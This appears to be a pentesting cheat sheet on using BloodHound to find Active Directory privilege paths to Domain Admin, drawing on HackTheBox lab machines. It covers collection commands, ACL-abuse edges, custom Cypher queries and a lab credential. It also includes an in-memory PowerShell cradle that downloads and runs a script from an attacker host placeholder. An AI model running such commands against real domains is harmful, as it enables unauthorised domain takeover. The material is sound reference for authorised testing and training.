# BloodHound Usage

> Visual graph of AD relationships. The single highest-leverage tool for
> finding privilege paths.

## Objective
Identify the shortest path from any owned principal to Domain Admin (or
any other privileged target) by graphing AD's groups, users, computers,
ACLs, sessions, and trust relationships.

## When To Use
After getting *any* AD credential. Before starting any privesc effort
in AD. After every new credential you obtain.

## Detection Indicators
This is a tool, not a vuln class. Use it whenever you have AD access.

## Enumeration Strategy

### Off-host collection (Linux side)

```bash
# bloodhound-python (== bloodhound.py)
bloodhound-python -u <user> -p '<pass>' -d <domain> -ns <dc-ip> -c All \
  -o bh-data
# produces .json files; -c All collects sessions, acls, groups, etc.
```

### On-host collection (Windows side)

```powershell
# upload SharpHound.exe (or use the .ps1)
.\SharpHound.exe -c All

# in-memory PS variant
IEX (New-Object Net.WebClient).DownloadString('http://<atk>/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All
```

### Loading

```bash
# start neo4j first
sudo neo4j start
# default creds: neo4j / neo4j → set password on first login

# start BloodHound (legacy GUI) or BloodHound CE (web UI)
bloodhound
# drag the JSON files into the import area
```

## Exploitation Workflow

After importing data:

1. **Mark owned**: right-click your foothold user → "Mark User as Owned".
2. Run "Find Shortest Paths to Domain Admins".
3. Run "Find Principals with DCSync Rights".
4. Run "Shortest Path from Owned Principals".
5. For each edge in the path, click → "Help" → BloodHound shows the
   abuse procedure.

## Pre-built queries every operator should know

- **Find all Domain Admins** — baseline.
- **Find Shortest Paths to Domain Admins** — the obvious one.
- **Find Principals with DCSync Rights on the Domain** — direct path
  if you've owned a user with this.
- **Find Computers where Domain Users are Local Admin** — common pivot.
- **Map Domain Trusts** — for cross-trust attacks.
- **Find Kerberoastable Users** — feeds Kerberoast.
- **Find AS-REPRoastable Users** — feeds AS-REP.
- **Find Computers with Unconstrained Delegation** — for printer-bug-style
  abuses.

## Edge types you'll act on most

| Edge | Abuse |
|---|---|
| `MemberOf` | Transitive group membership; no abuse step needed |
| `GenericAll` | Reset password, set SPN, add to group |
| `GenericWrite` | Add SPN (targeted Kerberoast), set logon script |
| `WriteDACL` | Modify object's ACL → grant yourself rights |
| `WriteOwner` | Take ownership → modify ACL |
| `Owns` | Same as WriteOwner |
| `ForceChangePassword` | Reset target's password |
| `AddMember` | Add yourself to a group |
| `AllowedToDelegate` (S4U2Self/Proxy) | Constrained delegation abuse |
| `AllowedToAct` (RBCD) | Resource-Based Constrained Delegation |
| `DCSync` | Replicating Directory Changes (All) |
| `HasSession` | Compromise the host where target is logged in |
| `AdminTo` | Local admin on a machine |
| `CanRDP / CanPSRemote` | Remote shell access |
| `ReadGMSAPassword` | Group Managed Service Account password |
| `ReadLAPSPassword` | LAPS local admin password |

## Custom Cypher queries

For things the GUI doesn't expose:

```cypher
// every kerberoastable user that is a member of any *Admins group transitively
MATCH (u:User {hasspn: true})
WHERE EXISTS {
  MATCH p = (u)-[:MemberOf*1..]->(g:Group)
  WHERE g.name CONTAINS 'ADMIN'
}
RETURN u.name, u.serviceprincipalnames

// users with cleartext passwords in description
MATCH (u:User)
WHERE u.description IS NOT NULL AND u.description =~ '.*(?i)pass.*'
RETURN u.name, u.description
```

## Commands

```bash
# Start neo4j
sudo neo4j start
sudo neo4j status
sudo neo4j stop

# bloodhound-python options
bloodhound-python -u <u> -p '<p>' -d <domain> -ns <dc-ip> -c All
# -c   options: Group, LocalAdmin, Session, LoggedOn, Trusts, Default, ACL, ObjectProps, RDP, DCOM, PSRemote, Container, All
```

## Tool Usage

- **bloodhound-python (`bloodhound.py`)** — off-host LDAP+SMB driven
  collection. Easier than running SharpHound on the box.
- **SharpHound.exe / .ps1** — on-host; pulls session info more
  comprehensively.
- **BloodHound legacy GUI** — desktop app, used in older IppSec videos.
- **BloodHound CE (Community Edition)** — newer web-based version with
  improved query language.

## Common Mistakes

| Mistake | Symptom | Fix |
|---|---|---|
| Wrong DNS | Tool can't connect to DC | `--ns <dc-ip>` and add to `/etc/resolv.conf` |
| Stale data | Edges that no longer exist | Recollect with `-c All` |
| Forgetting "Mark Owned" | Path queries miss your foothold | Mark every owned principal |
| Wrong domain casing | Empty data | Use the exact realm name |
| Trusting "AdminTo" without testing | Sometimes it's stale | Confirm with `crackmapexec smb -u -p` |

## Decision-Making Logic

```
just got first AD cred → run bloodhound-python -c All
just got new cred       → run bloodhound-python -c All again, append
just got privesc        → re-mark new owned user, re-run "Shortest Paths"
```

Never rely on a single BloodHound run when you've moved laterally;
group memberships seen by user A may differ from those seen by user B.

## Pivot Opportunities
BloodHound paths are pivot opportunities by definition. Each edge type
maps to a follow-on technique.

## OPSEC Considerations
- SharpHound's session collection touches every machine in the domain
  (very loud).
- bloodhound-python pulls everything via LDAP and SMB; loud as a
  scanner.
- For real engagements, use targeted collection methods
  (`-c Group,ACL` first, expand later).

## Real HTB Examples

- **Forest** — BloodHound revealed `WriteDACL` chain via Account
  Operators → Exchange Windows Permissions → domain.
- **Sauna** — BloodHound confirmed `svc_loanmgr`'s direct DCSync ACE.
- **Cascade** — BloodHound confirmed AD Recycle Bin path.
- **Resolute, Mantis, Sizzle, Reel, Multimaster, Sniper, Cascade,
  Outdated, Authority, Forge** — every modern AD video uses BloodHound.

## Alternative Techniques

- **PowerView** — manual ACL queries (`Get-DomainObjectAcl`,
  `Find-InterestingDomainAcl`). Useful when you want to verify a
  BloodHound edge.
- **ADRecon** — broad AD recon report.
- **AD Explorer** — Sysinternals; offline AD snapshot for visual
  exploration.

## Automation Opportunities

```bash
# Always-recollect helper
collect() {
  rm -rf bh-data && mkdir bh-data && cd bh-data
  bloodhound-python -u "$1" -p "$2" -d "$3" -ns "$4" -c All
  cd -
}
collect svc-alfresco s3rvice htb.local 10.10.10.161
```

## Checklist

- [ ] neo4j running
- [ ] Collect with `-c All`
- [ ] Import all JSON
- [ ] Mark owned principals
- [ ] Run "Shortest Paths to Domain Admins"
- [ ] Run "Find Principals with DCSync Rights on the Domain"
- [ ] Re-run after each new credential

## Related Skills

- [`active-directory/dcsync.md`](dcsync.md)
- [`active-directory/writedacl-abuse.md`](writedacl-abuse.md)
- [`active-directory/kerberoasting.md`](kerberoasting.md)
- [`tool-usage/bloodhound.md`](../tool-usage/bloodhound.md)
- [`methodology/07-ad-attack-chains.md`](../methodology/07-ad-attack-chains.md)
